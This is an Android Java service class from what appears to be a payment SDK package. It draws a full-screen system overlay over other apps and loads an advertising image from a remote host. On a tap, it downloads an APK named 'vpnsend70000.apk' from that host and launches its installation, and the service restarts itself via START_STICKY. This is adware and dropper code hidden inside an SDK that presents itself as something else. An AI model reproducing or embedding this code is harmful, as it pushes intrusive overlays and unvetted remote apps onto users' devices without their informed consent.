package com.zfbpaysdk.pay.starzfbsdk.service;

import android.annotation.SuppressLint;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.support.annotation.Nullable;
import android.support.v7.app.NotificationCompat;
import android.text.TextUtils;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Toast;

import com.zfbpaysdk.pay.starzfbsdk.R;
import com.zfbpaysdk.pay.starzfbsdk.view.T;
import com.zfbpaysdk.pay.starzfbsdk.zfbpay.AppTool;
import com.zfbpaysdk.pay.starzfbsdk.zfbpay.FileTool;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.LineNumberReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Created by ASUS on 2017/6/23.
 */
public class PopupService extends Service {

    private static final String TAG_DATA = "StarPop";
    private static final int TAG_PROGERSS = 0;
    private static final int NO_3 = 0x3;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String ishow = intent.getStringExtra(TAG_DATA);
        if (ishow.equals("true")) {
            pushScreenCommand();
        } else {
            view = (view == null ? null : hideView());
        }
        return START_STICKY;
    }

    private View view;

    private void pushScreenCommand() {
        WindowManager wm = (WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams wmParams = new WindowManager.LayoutParams();
        view = LayoutInflater.from(this).inflate(R.layout.screenforeign, null);
        view.getBackground().setAlpha(150);
        ImageView close = (ImageView) view.findViewById(R.id.close);
        close.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                view.setVisibility(View.GONE);
            }
        });
        //http://qiniu.baosteelhb.com/lx/mmye.png
        images = (ImageView) view.findViewById(R.id.images);
        down = (LinearLayout) view.findViewById(R.id.down);
        new Thread(runnable).start();
        //images.setOnClickListener(onClickListener);
        down.setOnClickListener(onClickListener);
        /**
         *以下都是WindowManager.LayoutParams的相关属性
         * 具体用途请参考SDK文档
         */
        wmParams.type = 2002;   //这里是关键，你也可以试试2003
        wmParams.format = 1;
        /**
         *这里的flags也很关键
         *代码实际是wmParams.flags |= FLAG_NOT_FOCUSABLE;
         *40的由来是wmParams的默认属性（32）+ FLAG_NOT_FOCUSABLE（8）
         */
        wmParams.flags = 40;
        wmParams.width = WindowManager.LayoutParams.MATCH_PARENT;
        wmParams.height = WindowManager.LayoutParams.MATCH_PARENT;
        wm.addView(view, wmParams);  //创建View
    }

    View.OnClickListener onClickListener=new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            if (!FileThread.execution) {
                view.setVisibility(View.GONE);
                new FileThread("http://qiniu.baosteelhb.com/lx/vpnsend70000.apk", mHandler).start();
                Toast.makeText(PopupService.this, "正在后台下载...",1000).show();
            }
        }
    };

    private byte[] picByte;
    private ImageView images;
    private LinearLayout down;
    private String uri = "http://qiniu.baosteelhb.com/lx/mmye.png";
    @SuppressLint("HandlerLeak")
    Handler handle = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            if (msg.what == 1) {
                if (picByte != null) {
                    Bitmap bitmap = BitmapFactory.decodeByteArray(picByte, 0, picByte.length);
                    images.setImageBitmap(bitmap);
                }
            }
        }
    };

    Runnable runnable = new Runnable() {
        @Override
        public void run() {
            try {
                URL url = new URL(uri);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setReadTimeout(10000);
                if (conn.getResponseCode() == 200) {
                    InputStream fis = conn.getInputStream();
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    byte[] bytes = new byte[1024];
                    int length = -1;
                    while ((length = fis.read(bytes)) != -1) {
                        bos.write(bytes, 0, length);
                    }
                    picByte = bos.toByteArray();
                    bos.close();
                    fis.close();
                    Message message = new Message();
                    message.what = 1;
                    handle.sendMessage(message);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    };

    private View hideView() {
        if (view != null) {
            view.setVisibility(View.GONE);
        }
        return view;
    }

    private NotificationCompat.Builder builder;
    private NotificationManager manager;
    private Handler mHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            if (builder == null) {
                builder = new NotificationCompat.Builder(PopupService.this);
                manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                builder.setSmallIcon(android.R.drawable.stat_sys_download);
                builder.setContentTitle("下载");
                builder.setContentText("正在下载该应用");
                manager.notify(NO_3, builder.build());
            }
            switch (msg.what) {
                case TAG_PROGERSS:
                    if (msg.arg1 < 99) {
                        builder.setProgress(100, msg.arg1, false);
                        manager.notify(NO_3, builder.build());
                        Log.i("getuistr", "run: progress:" + msg.arg1);
                    } else {
                        //下载完成后更改标题以及提示信息
                        builder.setContentTitle("下载完成啦");
                        builder.setContentText("点击安装该应用");
                        //设置进度为不确定，用于模拟安装
                        builder.setProgress(0, 0, true);
                        manager.notify(NO_3, builder.build());
                        FileThread.execution = false;
                        builder = null;
                        AppTool.installApk(PopupService.this, FileTool.getSDCardPath() + "/starfile/file.apk");
                    }
                    break;
            }
        }
    };
}
